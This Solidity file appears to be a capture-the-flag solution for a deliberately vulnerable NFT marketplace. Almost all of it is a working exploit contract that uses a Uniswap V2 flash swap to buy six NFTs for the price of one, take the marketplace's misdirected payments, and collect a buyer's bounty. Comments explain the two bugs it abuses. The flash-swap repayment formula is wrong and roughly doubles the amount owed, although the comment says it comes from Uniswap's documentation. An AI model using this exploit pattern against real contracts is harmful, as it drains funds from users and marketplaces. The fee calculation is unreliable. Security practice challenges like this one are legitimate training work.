// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Router {}

interface INFTMarketplace {
    function token() external returns (address);

    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IBuyerContract {}

interface IWETH {
    function approve(address guy, uint wad) external returns (bool);

    function transfer(address dst, uint wad) external returns (bool);

    function withdraw(uint wad) external;

    function deposit() external payable;
}

contract MarketplaceAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair pair =
        IUniswapV2Pair(0x5D70Af5E2015D0F76892F8a100D176423420B7db);
    IUniswapV2Router router =
        IUniswapV2Router(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);
    INFTMarketplace market =
        INFTMarketplace(0x0165878A594ca255338adfa4d48449f69242Eb8F);
    IBuyerContract buyer =
        IBuyerContract(0x663F3ad617193148711d28f5334eE4Ed07016602);
    IWETH weth = IWETH(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    DamnValuableNFT nft = DamnValuableNFT(market.token());

    // There are two bugs in the marketplace contract.
    //
    // The 1st bug in the marketplace contract is that it pays the owner of the
    // token AFTER the token has already been transferred to the buyer:
    //
    // token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
    // payable(token.ownerOf(tokenId)).sendValue(priceToPay);
    //
    // The issue here is that `safeTransferFrom()` will also transfer the
    // ownership of the token to the buyer (in this case, msg.sender). This
    // means that when token.ownerOf(tokenId) is paid after the transfer, the
    // marketplace actually pays back the buyer.
    //
    // The 2nd bug is that the `buyMany()` function will call `buyOne()` X amount
    // of times, but it uses the same `msg.value` for each call to `buyOne()`
    // Even if each NFT technically costs 15 ETH, we can just send 15 ETH and buy
    // all 6. The extra 5 * 15 = 75 ETH will be paid to us by the marketplace.
    function exploit() public {
        // UniswapV2 allows us to do flash swaps:
        // https://docs.uniswap.org/protocol/V2/concepts/core-concepts/flash-swaps
        //
        // Lets flash swap 15 ETH, buy all the NFTs, and return it back.
        // token0 is WETH, and token1 is DVT, we only want WETH.
        //
        // The calldata must have at least one byte in it to trigger a flash
        // swap. This will trigger uniswapV2Call() below.
        pair.swap(15 ether, 0, address(this), "A");

        // We should now be able to transfer all 6 NFTs to the buyer contract.
        //
        // NOTE: We need to use `safeTransferFrom()` here. `transferFrom()` does
        // exactly the same thing except one small detail: it does not check
        // if the `to` address is a contract, and thus it does not call that
        // contract's `onERC721Received()` function. We need this to be called
        // so we can get our money from the buyer.
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }

        // Finally, pay the entire balance in this contract back to the
        // attacker
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");

        require(success, "Attack failed somehow");
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) public override {
        // Now that we have 15 WETH, lets buy all 6 NFTs off the marketplace
        // Now, lets purchase all 6 NFTs off the marketplace
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        weth.withdraw(amount0); // Convert WETH to ETH
        market.buyMany{value: amount0}(tokenIds);

        // When we pay back the pair contract, we need to account for the
        // standard 0.3% fee on the UniswapV2 exchange.
        //
        // Calculated using UniswapV2 docs:
        // https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps#single-token
        uint256 amountToReturn = amount0 + ((amount0 * 1000) / 997);
        weth.deposit{value: amountToReturn}(); // Convert ETH back to WETH
        weth.transfer(msg.sender, amountToReturn);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
